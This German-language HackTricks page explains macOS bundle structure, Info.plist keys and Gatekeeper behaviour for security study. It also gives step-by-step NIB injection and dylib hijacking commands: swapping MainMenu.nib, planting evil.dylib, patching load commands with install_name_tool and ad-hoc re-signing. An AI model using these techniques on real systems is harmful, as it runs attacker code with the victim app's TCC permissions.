# macOS-Bundles

{{#include ../../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Bundles in macOS dienen als Container für eine Vielzahl von Ressourcen, einschließlich Anwendungen, Libraries und anderen notwendigen Dateien, sodass sie im Finder als einzelne Objekte erscheinen, wie die bekannten `*.app`-Dateien. Das am häufigsten anzutreffende Bundle ist das `.app`-Bundle, obwohl auch andere Typen wie `.framework`, `.systemextension` und `.kext` verbreitet sind.

### Wesentliche Komponenten eines Bundles

Innerhalb eines Bundles, insbesondere im Verzeichnis `<application>.app/Contents/`, sind verschiedene wichtige Ressourcen untergebracht:

- **\_CodeSignature**: Dieses Verzeichnis speichert Code-Signing-Details, die wichtig sind, um die Integrität der Anwendung zu überprüfen. Sie können die Code-Signing-Informationen mit Befehlen wie den folgenden einsehen:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Enthält die ausführbare Binärdatei der Anwendung, die bei Benutzerinteraktion gestartet wird.
- **Resources**: Ein Aufbewahrungsort für die UI‑Komponenten der Anwendung, einschließlich Bilder, Dokumente und Interface‑Beschreibungen (nib/xib Dateien).
- **Info.plist**: Dient als Hauptkonfigurationsdatei der Anwendung und ist entscheidend dafür, dass das System die Anwendung korrekt erkennt und damit interagiert.

#### Important Keys in Info.plist

Die Datei `Info.plist` ist ein Eckpfeiler der Anwendungs­konfiguration und enthält Schlüssel wie:

- **CFBundleExecutable**: Gibt den Namen der Hauptausführungsdatei an, die im Verzeichnis `Contents/MacOS` liegt.
- **CFBundleIdentifier**: Liefert eine globale Kennung für die Anwendung, die von macOS umfassend zur Verwaltung von Anwendungen verwendet wird.
- **LSMinimumSystemVersion**: Gibt die minimale macOS‑Version an, die für das Ausführen der Anwendung erforderlich ist.

### Exploring Bundles

Um den Inhalt eines Bundles, wie `Safari.app`, zu untersuchen, kann folgender Befehl verwendet werden: `bash ls -lR /Applications/Safari.app/Contents`

Diese Untersuchung zeigt Verzeichnisse wie `_CodeSignature`, `MacOS`, `Resources` und Dateien wie `Info.plist`, die jeweils eine eigene Funktion erfüllen — von der Sicherung der Anwendung bis zur Definition der Benutzeroberfläche und Betriebsparameter.

#### Additional Bundle Directories

Neben den gängigen Verzeichnissen können Bundles auch enthalten:

- **Frameworks**: Beinhaltet gebündelte Frameworks, die von der Anwendung genutzt werden. Frameworks sind ähnlich wie dylibs, aber mit zusätzlichen Ressourcen.
- **PlugIns**: Ein Verzeichnis für Plug‑ins und Erweiterungen, die die Fähigkeiten der Anwendung erweitern.
- **XPCServices**: Enthält XPC‑Services, die von der Anwendung für die out‑of‑process Kommunikation genutzt werden.

Diese Struktur stellt sicher, dass alle notwendigen Komponenten innerhalb des Bundles gekapselt sind und so eine modulare und sichere Anwendungsumgebung ermöglichen.

Für detailliertere Informationen zu den `Info.plist`‑Schlüsseln und deren Bedeutungen bietet die Apple‑Entwicklerdokumentation umfangreiche Ressourcen: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Security Notes & Abuse Vectors

- **Gatekeeper / App Translocation**: Wenn ein quarantänisiertes Bundle erstmals ausgeführt wird, führt macOS eine tiefgehende Signaturprüfung durch und kann es von einem zufällig erzeugten translozierten Pfad aus starten. Nach der Annahme führen spätere Starts nur noch oberflächliche Prüfungen durch; Resource‑Dateien in `Resources/`, `PlugIns/`, nibs etc. wurden historisch nicht überprüft. Seit macOS 13 Ventura wird bei der ersten Ausführung eine Tiefenprüfung erzwungen und die neue *App Management* TCC‑Berechtigung schränkt Drittprozesse darin ein, andere Bundles ohne Benutzerzustimmung zu modifizieren, aber ältere Systeme bleiben anfällig.
- **Bundle Identifier collisions**: Mehrere eingebettete Ziele (PlugIns, helper tools), die denselben `CFBundleIdentifier` wiederverwenden, können die Signaturprüfung beschädigen und gelegentlich URL‑Scheme‑Hijacking/-Verwirrung ermöglichen. Immer Sub‑Bundles aufzählen und eindeutige IDs verifizieren.

## Resource Hijacking (Dirty NIB / NIB Injection)

Vor Ventura konnte das Austauschen von UI‑Ressourcen in einer signierten App die oberflächliche Code‑Signierung umgehen und Codeausführung mit den Berechtigungen der App ermöglichen. Aktuelle Forschung (2024) zeigt, dass dies weiterhin auf pre‑Ventura‑Systemen und bei nicht‑quarantänisierten Builds funktioniert:

1. Ziel‑App an einen beschreibbaren Ort kopieren (z. B. `/tmp/Victim.app`).
2. Ersetze `Contents/Resources/MainMenu.nib` (oder jede in `NSMainNibFile` deklarierte nib) durch eine bösartige, die `NSAppleScript`, `NSTask` etc. instanziiert.
3. App starten. Die bösartige nib wird unter der Bundle‑ID und den Berechtigungen des Opfers ausgeführt (TCC‑Grants, Mikrofon/Kamera etc.).
4. Ventura+ mindert das Risiko, indem das Bundle bei der ersten Ausführung tiefgehend überprüft wird und für spätere Änderungen die *App Management*‑Berechtigung erforderlich ist, wodurch Persistenz schwieriger wird, aber Angriffe beim ersten Start auf älteren macOS weiterhin möglich sind.

Minimal malicious nib payload example (compile xib to nib with `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking innerhalb von Bundles

Weil `@rpath`-Lookups gebündelte Frameworks/PlugIns bevorzugen, kann das Ablegen einer bösartigen Library in `Contents/Frameworks/` oder `Contents/PlugIns/` die Lade-Reihenfolge umleiten, wenn das Haupt-Binary ohne Library-Validierung oder mit schwacher `LC_RPATH`-Reihenfolge signiert ist.

Typische Schritte beim Ausnutzen eines nicht signierten/ad‑hoc Bundles:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
- Hardened runtime, bei dem `com.apple.security.cs.disable-library-validation` fehlt, blockiert third-party dylibs; überprüfe zuerst die entitlements.
- XPC services unter `Contents/XPCServices/` laden oft sibling frameworks—patch deren binaries ähnlich für persistence- oder privilege escalation-Pfade.

## Schnellinspektions-Checkliste
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Referenzen

- [Bringing process injection into view(s): Ausnutzen von macOS-Apps mithilfe von nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
{{#include ../../../banners/hacktricks-training.md}}
